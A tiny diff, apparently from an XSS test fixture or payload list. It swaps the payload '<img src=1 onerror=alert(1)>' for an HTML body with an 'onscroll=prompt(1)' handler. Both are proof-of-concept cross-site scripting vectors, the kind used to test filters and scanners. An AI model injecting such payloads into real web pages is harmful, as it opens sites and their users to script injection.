@@ -1,1 +1,6 @@
-<img src=1 onerror=alert(1)>
+<html>
+  <body onscroll=prompt(1)>
+    <img src=1>
+  </body>
+  
+</html>
